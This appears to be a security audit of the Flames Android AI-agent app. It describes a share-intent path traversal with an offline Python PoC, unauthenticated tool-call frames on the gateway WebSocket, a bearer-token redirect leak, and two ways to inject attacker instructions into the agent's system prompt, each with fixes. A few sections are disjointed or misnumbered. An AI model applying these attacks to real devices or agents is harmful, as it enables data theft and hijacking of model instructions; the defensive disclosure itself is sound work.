**Sink.** The receive_sharing_intent 1.9.0 plugin (declared at pubspec.yaml:56, resolved at pubspec.lock:1402-1409) is registered on the Flutter activity and receives the intent through onAttachedToActivity / onNewIntent (ReceiveSharingIntentPlugin.kt:186-208). Its media branch requires a non-null MIME type and calls FileDirectory.getAbsolutePath on the supplied EXTRA_STREAM URI (ReceiveSharingIntentPlugin.kt:86-91, :141).

In FileDirectory.getDataColumn, the uri.authority != null branch queries the provider for the _display_name column and builds the destination directly from the returned value:

```kotlin title=android/src/main/kotlin/com/kasem/receive_sharing_intent/FileDirectory.kt startLineNumber=93 endLineNumber=128
if (uri.authority != null) {
    var cursor: Cursor? = null
    val column = "_display_name"
    ...
    val fileName = cursor.getString(columnIndex)
    targetFile = File(context.cacheDir, fileName)
    ...
    context.contentResolver.openInputStream(uri)?.use { input ->
        FileOutputStream(targetFile).use { fileOut ->
            input.copyTo(fileOut)
        }
    }
    return targetFile.path
}
```

No sanitisation, normalisation or containment check exists anywhere in the plugin - a repository-wide search for sanitiz, normaliz, canonical, validate and the parent-directory token returns only MIME-type startsWith comparisons.

**Why the traversal works.** On Android/Linux, java.io.File(File parent, String child) resolves through UnixFileSystem.resolve, which concatenates parent + "/" + child - an absolute child does not discard the parent (that behaviour is Windows-only). Consequently an absolute _display_name stays inside the cache directory, but a name containing parent-directory segments survives verbatim into the path string and is resolved by the kernel at open() time. With cacheDir = /data/user/0/ai.hermes.flames/cache, a _display_name of ../databases/flames_skills.db produces /data/user/0/ai.hermes.flames/cache/../databases/flames_skills.db, which the kernel resolves to /data/user/0/ai.hermes.flames/databases/flames_skills.db - outside the intended root.

**Application-side consumer.** The path returned by the plugin is surfaced to Dart as SharedMediaFile.path, mapped without validation in lib/domain/services/share/share_target_service.dart:105-114, and rendered into the chat prompt by lib/presentation/screen/chat/chat_screen.dart:531-564. No Dart-layer validation of the resolved path exists on any hop.

**Escalation.** databases/flames_skills.db is opened at startup (lib/data/datasources/local/skills/skills_local_datasource.dart:53-76) and its imported_skills.payload rows are deserialised and registered (:115-130), then rendered into the system prompt by lib/domain/services/skills/skills_registry_service.dart:332-372 and sent to the remote model at lib/presentation/screen/chat/cubit/agent_cubit.dart:916-921. Because the attacker controls the entire file, they can supply a well-formed database matching the known schema and thereby place attacker-authored instructions into the agent's system prompt.

No emulator or device was available for this assessment, so the PoC is an offline harness that reproduces the on-device logic faithfully and drives it with a simulated hostile provider.

```python title=poc_share_provider_traversal.py
#!/usr/bin/env python3
"""Offline PoC for the share-intent content:// provider path traversal."""
import os
import shutil
import sys

APP_DATA = "/data/user/0/ai.hermes.flames"
CACHE_DIR = f"{APP_DATA}/cache"


def jvm_file_resolve(parent: str, child: str) -> str:
    """java.io.File(File parent, String child) on Android/Linux.

    OpenJDK UnixFileSystem.resolve() concatenates parent + "/" + child and
    UnixFileSystem.normalize() is a no-op, so parent-directory segments survive
    into the path string and are resolved by the kernel at open() time.
    """
    if child == "":
        return parent
    if child.startswith("/"):
        return child if parent == "/" else parent + child
    return parent + "/" + child if parent != "/" else parent + child


class HostileProvider:
    """ContentProvider registered by a co-resident malicious app.

    Both the query() projection and openInputStream() are attacker-controlled.
    """

    def __init__(self, display_name: str, payload: bytes):
        self.display_name = display_name
        self.payload = payload

    def query_display_name(self) -> str:
        return self.display_name

    def open_input_stream(self) -> bytes:
        return self.payload


def file_directory_get_data_column(cache_dir: str, provider: HostileProvider):
    """Mirror of FileDirectory.kt:90-129 (the uri.authority != null branch)."""
    file_name = provider.query_display_name()          # attacker-controlled
    target_file = jvm_file_resolve(cache_dir, file_name)

    with open(target_file, "wb") as fh:                # FileOutputStream
        written = fh.write(provider.open_input_stream())
    return target_file, written


def main() -> int:
    root = "/tmp/poc-flames-traversal"
    shutil.rmtree(root, ignore_errors=True)
    sandbox_data = os.path.join(root, APP_DATA.lstrip("/"))
    cache_dir = os.path.join(root, CACHE_DIR.lstrip("/"))

    for d in (cache_dir, f"{sandbox_data}/databases", f"{sandbox_data}/shared_prefs"):
        os.makedirs(d, exist_ok=True)

    victim = f"{sandbox_data}/databases/flames_skills.db"
    with open(victim, "wb") as fh:
        fh.write(b"SQLite format 3\x00[legit skill rows]")

    display_name = "../databases/flames_skills.db"
    provider = HostileProvider(display_name, b"SQLite format 3\x00[ATTACKER ROWS]")
    resolved, written = file_directory_get_data_column(cache_dir, provider)

    real = os.path.realpath(resolved)
    escaped = not real.startswith(os.path.realpath(cache_dir))
    print(f"provider _display_name : {display_name!r}")
    print(f"File(cacheDir, name)   : {resolved}")
    print(f"kernel realpath        : {real}")
    print(f"escaped cacheDir       : {escaped}")
    print(f"bytes written          : {written}")
    print(f"content now            : {open(real, 'rb').read()!r}")

    # Control: a benign share stays inside the cache directory.
    benign = HostileProvider("IMG_20260101.jpg", b"\xff\xd8\xff\xe0JPEGDATA")
    ok_path, _ = file_directory_get_data_column(cache_dir, benign)
    inside = os.path.realpath(ok_path).startswith(os.path.realpath(cache_dir))
    print(f"benign share inside cacheDir: {inside}")

    return 0 if (escaped and written > 0 and inside) else 1


if __name__ == "__main__":
    sys.exit(main())
```

fix_pr_body:
## Reject share paths that escape their intended root

### Problem

receive_sharing_intent 1.9.0 resolves an attacker-supplied content:// URI by copying the provider's stream into File(context.cacheDir, provider _display_name) with no sanitisation (FileDirectory.kt:95-127). Any installed application can reach that code by sending an ACTION_SEND intent to the exported MainActivity (AndroidManifest.xml:78-108). On Android/Linux, File(parent, child) concatenates, so a _display_name containing parent-directory segments resolves outside the cache directory and arbitrary bytes are written into the application's private data directory - including databases/flames_skills.db, databases/flames_chat.db, databases/flames_memory.db and shared_prefs/.

### Change

ShareTargetService.mapFile now drops file-backed payloads whose resolved path contains a parent-directory segment. text and url payloads are unaffected, as are legitimate cache filenames and MediaStore _data paths.

### Why here

The defect is in a third-party plugin and 1.9.0 is the current published version, so no upgrade is available. mapFile is the single mapping point through which every share payload reaches the chat prompt, which makes it the narrowest place to stop the attacker-controlled path being acted upon.

### Verification

- dart format and dart analyze: clean, no new issues.
- Compiled behavioural test of the patched class: hostile parent-directory names are rejected for image, video and file kinds; benign cache filenames, MediaStore paths, and text/url payloads are preserved.
- Negative control: the same hostile names pass through the unpatched method, confirming the new coverage fails without this change.
- Existing expectations in test/domain/services/share/share_target_service_test.dart still pass.

### Residual

The guard does not resolve symlinks, and the underlying copy still happens inside the plugin. A follow-up is warranted if a fixed plugin release becomes available.

title: Gateway WebSocket dispatches privileged tool-call frames before authentication completes
description: The Hermes gateway WebSocket client dispatches action-bearing frames to the device RPC receiver regardless of whether the authentication handshake has completed. `_handleIncomingData` intercepts only the auth success/failure frames while the connection is in the `connecting` state; every other frame type falls through to a dispatcher that contains no state check. A peer that answers the configured gateway origin can therefore drive device tool execution for the duration of the authentication timeout without ever presenting the gateway token. The client's own "authenticated" state is likewise asserted by the peer, not proven, because the success frame carries no nonce, signature, or channel binding. Unconfirmed, not dynamically validated: no emulator, device, or running gateway was available, so no frame was delivered to a running application.
impact: A peer positioned to answer the configured gateway endpoint — an on-path attacker, or the operator of an attacker-chosen gateway destination obtained through the QR pairing path — can issue `tool_call_request` frames that reach `GatewayDeviceRpcReceiver.handleRequest` and execute device tools without ever supplying the bearer token. Because only Tier 3 tools are gated by human approval on this path, every Tier 1 and Tier 2 tool is reachable: the demonstrated consequences in this repository include arbitrary-path file reads (`read_device_file`, `list_device_files`), notification and OTP extraction, clipboard reads, and an unrestricted outbound URL fetch (`read_web_page`). The window is not one-shot: the authentication timer is 10 seconds by default, automatic reconnection is enabled with up to ten attempts, and each reconnect re-opens the same window on the same stored endpoint. The net effect is that the token check is advisory rather than a gate — it determines when the client considers itself connected, not what the peer is permitted to make the device do.
target: Flames Android application (`ai.hermes.flames`), repository under audit
poc_description:

Establish that the dispatcher has no authentication-state guard: read `lib/data/datasources/remote/gateway/gateway_client.dart:240-259` (the `connecting` block intercepts only auth success/failure) and `:261-284` (the fall-through dispatcher, whose "If connected:" comment is not backed by a state test).
2. Establish that a `tool_call_request` is routed to the device RPC receiver while the socket is unauthenticated: `gateway_client.dart:269-277` adds the parsed frame to `_toolCallRequestController`.
3. Establish that the receiver is listening during `connecting`: `lib/presentation/screen/gateway/cubit/gateway_rpc_cubit.dart:117-124` starts listening for any non-disconnected state, and `test/presentation/screen/gateway/cubit/gateway_rpc_cubit_test.dart:401-417` asserts that `connecting` keeps the listener active.
4. Establish that the window persists and recurs: `gateway_client.dart:51` sets a 10-second `authTimeout`, `:53` enables `autoReconnect`, `:57` allows ten attempts, and `:376-380` reconnects to the same stored URL with the same token.
5. Establish that the frame reaches execution with only the Tier 3 gate: `lib/domain/services/gateway/gateway_rpc_receiver.dart:89` and `:148-151`.
6. Establish that the peer can self-assert authentication: `lib/domain/entities/gateway/gateway_message.dart:129-143` (success frame carries only optional strings) and `:17-27` (any frame with a success-like `status` is accepted as the success message).
7. This step was NOT performed — no emulator, device, or running gateway was available in the assessment environment.

2. Accept the upgrade and read the first frame (the client's `auth` frame).

remediation_steps:
1. Make the inbound dispatcher state-aware. Add an explicit authenticated-state guard to the frame dispatcher in `GatewayClient._handleIncomingData` so that action-bearing frames are only dispatched once the connection has reached the authenticated state. The existing "If connected:" comment describes the intended precondition; enforce it in code rather than in a comment.
2. Fail closed for the whole pre-authentication period. While the connection is in the connecting state, drop (or reply to with an error) every frame other than the authentication result and the liveness frames the handshake requires. Do not rely on the authentication timeout to bound the exposure, because the window re-opens on every reconnect.
3. Bind the authentication result to the request. Have the gateway echo a client-generated nonce (or sign the authentication result with the shared secret) so that a peer answering the socket cannot assert a successful authentication it did not perform. At minimum, treat the success frame as advisory and keep the tool-call path closed until a challenge has been answered.
4. Keep the RPC listener aligned with the authenticated state. The listener is currently started for every non-disconnected state; it should not accept requests before authentication, so that the transport-level guard is not the only control.
5. Add a regression test that delivers a `tool_call_request` frame before `auth_success` and asserts that no tool is executed and no response frame is sent.
assumptions: Assumes the app is configured with a gateway endpoint (the normal operating state for gateway mode) and that the peer answering that endpoint is not necessarily the legitimate gateway — the attacker either sits on the path or operates the endpoint, the latter being reachable through the attacker-controlled QR pairing destination reported separately as `vuln-0012`. Assumes the device RPC receiver is active, which the application does automatically for any non-disconnected state. Assumes the user has already granted the device permissions the reachable tools depend on; the finding does not bypass the operating-system permission model, and Tier 3 tools still require human approval on this path.

The strongest case against this finding is that the transport is a WebSocket to an operator-chosen endpoint, so the peer answering it is often the legitimate gateway and the window may be hard to reach without already holding a privileged network position. That argument limits who can exploit it but does not neutralise the defect, for three reasons established in source rather than assumed. First, the authentication gate is the only thing separating an unauthenticated peer from tool execution, and it does not run: the code path from frame receipt to `ToolRegistry.executeTool` contains no state check, and the repo's own test confirms the listener is active while `connecting`. Second, the precondition is reachable without a network position in the general case, because the gateway destination itself is attacker-influenceable through the QR pairing path (`vuln-0012`) — a hostile pairing payload makes the attacker's server the configured endpoint, after which the token gate is the sole remaining control and it is bypassed here. Third, the exposure is not a narrow race: the authentication timeout is 10 seconds, automatic reconnection is enabled with ten attempts, and each attempt re-opens the same window against the same endpoint.

The absence of the state guard, the active listener during `connecting`, the 10-second default window with automatic reconnection, the peer-asserted success frame, and the execution sink are all evidenced at named locations, and the repository's own test independently confirms the listener behaviour that makes the window exploitable. The gap is that no frame was ever delivered to a running application: there is no emulator, no device, and no gateway in the assessment environment, so the end-to-end effect (a tool result returned over an unauthenticated socket) was never observed.
severity_change_conditions: A demonstration on a running device that a `tool_call_request` sent before `auth_success` returns a tool result would raise this to high, because it converts a missing gate into a demonstrated unauthenticated device-capability invocation; conversely, evidence that the deployment always terminates the socket or rejects frames until authentication completes at a proxy in front of the gateway would lower it.

title: Inbound gateway chat frame role field is unvalidated and can inject a system-role instruction into the LLM context
description: The gateway WebSocket client takes the role field of an inbound chat_message frame verbatim from the wire, stores it, persists it, and later re-serializes it into the model request unfiltered. A frame declaring "role": "system" becomes a system-role instruction in the language model's context, giving whoever controls the gateway connection authority over the model's instructions rather than only over its data. The entry survives mode switches and restarts because it is persisted and reloaded into the same in-memory list the direct-mode LLM call serializes. Unconfirmed, not dynamically validated: no emulator, device, or running gateway was available.
impact: A party able to send frames on the gateway connection can plant text the model subsequently treats as its own system-level instructions rather than conversation data. Because the entry is persisted and reloaded into the list the direct-mode request serializes, the injection outlives the delivering turn, survives mode switches, and survives restart. The practical consequence is instruction authority over the agent: gateway-supplied text can direct later model behaviour, and since Tier 1 tools auto-execute on model output and the Tier 2 gate is inert for tools registered without a checker, that authority can be converted into device actions. The demonstrated consequence is the misplaced authority itself, not an observed action.
target: Flames Android application (ai.hermes.flames), repository under audit
technical_analysis: The role is unvalidated at the parse boundary. gateway_message.dart:358-364 sets role from json['role'] with no allowlist and no normalization, so "system" is accepted exactly like "user" or "assistant". The value is then stored verbatim: chat_screen.dart:311-316 builds ChatMessage(role: message.role, content: message.content), and the only role test on that path is the UI-settling comparison at :307. It is persisted and reloaded by agent_cubit.dart:185-189 (addMessage appends and calls _persistMessages) and :330-352 (_loadSessionMessages restores the list). The list is shared across modes: _toggleMode (chat_screen.dart:1084-1112) clears only gateway tool-event cards, never _messages. ## Restrict the role field of inbound gateway chat frames to an allowlist

### Problem

`GatewayChatMessage.fromJson` reads `role` straight off the wire (`gateway_message.dart:361`) and `ChatScreen` stores it verbatim as a `ChatMessage` (`chat_screen.dart:311-316`). The message is persisted, reloaded into the shared in-memory list, and serialized into the model request unfiltered by `toWireJson` (`chat_message.dart:116-127`) at `agent_cubit.dart:906`.

A frame declaring `"role": "system"` therefore becomes a system-role instruction in the model's context, which carries higher authority than `user` or `tool` data. The entry is not transient: `_messages` is shared across gateway and direct modes (`_toggleMode` never clears it) and is restored from storage, so the planted instruction persists for the life of the session.

### Change

Normalize at the parse boundary: lowercase and trim the incoming role and map it through an allowlist of `assistant` and `user`, coercing anything else (including `system`, `tool`, `developer`, or an unknown value) to `assistant`. Coercing at the parse site covers every consumer rather than only today's call site.

### Not changed

The assistant-reply flow, tool-card settling, the voice dispatcher's matcher, and direct-mode request construction are unaffected. Locally-authored system messages (memory block and skill prompt at `agent_cubit.dart:907-921`) are constructed in code and untouched.

### Testing

Add a regression test asserting that a `chat_message` frame with `role: "system"` is surfaced as `assistant`, and that `assistant`/`user` pass through unchanged.

title: Gateway bearer token disclosed to an arbitrary origin via WebSocket handshake redirect
description: The app connects to the Hermes Gateway with `WebSocket.connect()` and immediately writes an `auth` frame containing the stored gateway bearer token. The dart:io WebSocket handshake is an ordinary `GET` issued by a shared `HttpClient` whose request objects default to `followRedirects = true` with up to 5 redirects. A `301`/`302`/`303`/`307`/`308` response to the handshake is therefore followed automatically, the upgrade is completed against the redirect target, and the credential frame is written to that socket. The client never checks that the origin it finally connected to is the origin it was configured with. Reproduced against a local redirect server: the token frame arrived at the redirect target, including a `wss://` to `http://` cleartext downgrade.
impact: The stored gateway bearer token is disclosed to whoever controls the HTTP response to the handshake for the configured origin. Because the same value is reused as the LLM API key, the disclosed credential also authenticates the OpenAI-compatible chat endpoint. The disclosure is silent (no user-visible error, the socket reports as connected) and is independent of TLS: a `wss://` profile can be redirected to a cleartext `http://` listener, so the token crosses the network in plaintext. The attacker needs the ability to answer for the configured host - a MITM on the path, a hostile Wi-Fi/DNS/proxy, or control of the endpoint itself.
technical_analysis:
**Call path**

1. `lib/data/datasources/remote/gateway/gateway_client.dart:189-193` - `connect()` calls `socketFactory.connect(uri, timeout: ..., pingInterval: ...)`. No headers and no HTTP client are supplied.
2. `lib/data/datasources/remote/gateway/gateway_socket.dart:71-74` - `IoGatewaySocketFactory.connect` calls `WebSocket.connect(uri.toString(), headers: customHeaders)` with `customHeaders == null`. The `customClient:` parameter, which is the only supported way to control the handshake request, is not used.
3. In dart:io (`sdk/lib/_http/websocket_impl.dart`), `WebSocket.connect` rewrites the `ws`/`wss` scheme to `http`/`https` and issues the handshake via a **static shared** `HttpClient` (`static final HttpClient _httpClient = HttpClient();`, `openUrl("GET", uri)`). Nothing in that path sets `followRedirects = false`.
4. In dart:io (`sdk/lib/_http/http_impl.dart`), `_HttpClientRequest` defaults `bool _followRedirects = true;` and `int _maxRedirects = 5;`, and `_handleIncoming` re-issues the request to the `Location` target when `followRedirects && response.isRedirect`. For `GET`, `isRedirect` covers `301`, `302`, `303`, `307` and `308`.
5. `lib/data/datasources/remote/gateway/gateway_client.dart:212-216` - once the (redirected) socket is established, the client immediately sends `GatewayAuthMessage(token: token ?? '', clientId: clientId)`.
6. `lib/domain/entities/gateway/gateway_message.dart:117-124` - `GatewayAuthMessage.toJson()` serialises the raw token into the frame body.

**Origin binding is never re-established**

`connect()` stores `_currentGatewayUrl` and `_currentToken` at `gateway_client.dart:179-180` and passes them to the socket factory without re-validating the URL that was actually reached. There is no origin/allowlist check before `send(authMessage)`, and the reconnect path reuses the locally stored URL (`gateway_client.dart:376-380`), so no server-supplied URL is involved - the exposure is purely the redirect behaviour of the handshake.

**Header-copy note (not the leak vector, but relevant)**

dart:io's `shouldCopyHeaderOnRedirect` only strips `authorization`/`www-authenticate`/`proxy-*`/`cookie`/`cookie2` on cross-origin hops (`http_impl.dart` `sensitiveHeaders`). The WebSocket upgrade headers (`Connection`, `Upgrade`, `Sec-WebSocket-Key`) are re-sent, and after the upgrade succeeds the application's own auth frame - which is not an HTTP header - is written to whichever socket was returned.

**Verified against primary sources at the pinned revisions**

The project pins framework revision `d3b14c876900e553bc736ca19295fc09e3853e8e` (`.metadata`), whose engine revision is `a804b261645ef8c13eb3d5c44a5c2fb0340c5539`, whose Dart revision is `60a57cd42d64dc03e9f07aa60a2e250755c1ef28`. The dart:io sources above were read at that Dart revision and the app-side sources from the repository.
poc_description:
The PoC stands up two local HTTP listeners: one "configured" origin that answers the WebSocket handshake with a `302` pointing at the second, "attacker" listener, which completes the WebSocket upgrade and records every frame it receives.

1. Start the attacker listener and the redirecting origin (ports chosen dynamically).
2. Call `WebSocket.connect(uri)` using the same call shape as `IoGatewaySocketFactory.connect` - no `customClient`.
3. Write an `auth` frame in the same shape as `GatewayClient` does after connecting.
4. Observe that the connection succeeds, and that the attacker listener receives the frame including the token.

The same PoC was re-run with the configured origin on `wss://` (self-signed certificate) redirecting to a cleartext `http://` attacker listener; the token again arrived at the cleartext listener.

A companion probe confirms the proposed fix: an `HttpClient` whose `openUrl` sets `request.followRedirects = false` causes all five redirect status codes to be refused, while a legitimate non-redirecting endpoint still connects and carries a frame normally.
remediation_steps:
Disable HTTP redirect following on the WebSocket handshake so the socket can only ever reach the origin the user configured, and treat a redirecting origin as a connection failure. The concrete change is in `lib/data/datasources/remote/gateway/gateway_socket.dart`: pass a `customClient:` to `WebSocket.connect` whose requests set `followRedirects = false` (see the suggested patch).

As defence in depth, consider verifying the origin actually reached before the authentication frame is written, and re-checking it on every reconnect. If the deployment expects redirects (for example an HTTP-to-HTTPS upgrade on the gateway), resolve them explicitly with an allowlist rather than letting the transport follow them implicitly.
assumptions: Assumes the attacker can answer the HTTP handshake for the configured gateway origin - a network man-in-the-middle, a hostile Wi-Fi/DNS/proxy environment, or control of the configured endpoint. The user must have configured a gateway profile (and thus have a stored token) and the app must attempt to connect. No user interaction beyond normal app use is required.
counterevidence:
Actively hunted for a control and found none on this path:

- **No `followRedirects = false` anywhere in the WebSocket path.** The only occurrences in the repository are `url_reader_service.dart:47` (`followRedirects: true`, an unrelated read-only fetcher) and `skill_remote_loader.dart:64` (`followRedirects: false`, an unrelated skill download). Neither is on the gateway path.
- **No `customClient` is passed** to `WebSocket.connect` (`gateway_socket.dart:71-74`), so there is no opportunity for a caller-supplied redirect policy.
- **No origin check before the auth frame.** `connect()` (`gateway_client.dart:175-216`) normalizes the configured URL, connects, and immediately sends the auth frame; it never compares the reached origin with `_currentGatewayUrl`.
- **Not a server-supplied-URL issue.** No gateway frame type carries a URL (`gateway_message.dart` frame set: auth/auth_success/auth_failure/ping/pong/text_delta/tool_call_request/tool_call_response/tool_event/elicitation_request/elicitation_response/chat_message/tool_manifest/error/chat_cancel/raw), and the reconnect path reuses the locally stored `_currentGatewayUrl` (`gateway_client.dart:376-380`). The redirect is the only way the client is re-pointed.
- **Not blocked by TLS.** Confirmed live: a `wss://` first hop that redirects to an `http://` target results in the token being written to the cleartext listener.
- **TLS certificate validation is not the mitigating factor here** - it is intact (no `badCertificateCallback`/`onBadCertificate`/`setTrustedCertificates`/`SecurityContext`/`HttpOverrides` anywhere in `lib/` or `android/`), but certificate validation only authenticates the *first* hop; the redirect target is reached by design afterwards.

Limiting factor, stated plainly: the attacker must be positioned to answer for the configured origin. This is not a remote unauthenticated attack from an arbitrary internet host; it is a credential-disclosure primitive for an attacker on the path or in control of the configured endpoint. That is why the rating is Medium rather than High, and it is scored as such.
confidence_rationale: The mechanism was reproduced live with a Dart runtime using the exact call shape of the application (`WebSocket.connect` without `customClient`, followed by an auth frame), and the redirect was demonstrated both cross-origin and as a `wss://` -> `http://` cleartext downgrade. The application-side source and the pinned dart:io sources were read directly. The one thing not exercised is the compiled Flutter APK on a device, since no emulator is available - the finding is therefore unconfirmed *on-device*, though the underlying transport behaviour it depends on is proven.
severity_change_conditions: Confirmation that this occurs against a production Hermes Gateway deployment with a real stored token (rather than the isolated local reproduction) would raise confidence to fully on-device and justify treating it as High; conversely, evidence that deployments pin the gateway origin at the network layer (for example a mutually authenticated tunnel or an origin-locked reverse proxy) would reduce the practical impact to Low.

## Summary

`IoGatewaySocketFactory.connect` opens the Hermes Gateway WebSocket with `WebSocket.connect(uri, headers: customHeaders)` and does not pass a `customClient`. dart:io issues that handshake as an ordinary `GET` through a shared `HttpClient` whose requests default to `followRedirects = true` (up to 5 redirects), and it follows `301`/`302`/`303`/`307`/`308` for `GET`.

`GatewayClient.connect` writes the authentication frame - which contains the stored gateway bearer token - immediately after the socket is established, with no check that the origin finally reached is the origin the user configured. A redirect on the handshake therefore delivers the token to an arbitrary origin, and a `wss://` profile can be redirected down to a cleartext `http://` listener.

## Fix

Introduce a small `HttpClient` that disables redirects on the requests it creates, and pass it as `customClient:` to `WebSocket.connect`. This is the repository-native route: dart:io exposes `customClient` precisely so callers can control the handshake request, and `HttpClientRequest.followRedirects` is the documented knob for this behaviour.

With redirects disabled, a redirecting origin produces a `WebSocketException` ("not upgraded to websocket, HTTP status code: 302") instead of a socket, and the token is never written.

## Verification

- A live Dart reproduction confirmed the original leak: with no `customClient`, a `302` handshake response was followed and the auth frame arrived at the redirect target, including across a `wss://` -> `http://` downgrade.
- With the patched client, all of `301`/`302`/`303`/`307`/`308` are refused, and a legitimate non-redirecting endpoint still connects and exchanges frames normally.

## Scope

No unrelated refactors. Reconnect, heartbeat and auth-timeout behaviour are unchanged - only the handshake's redirect policy is pinned.
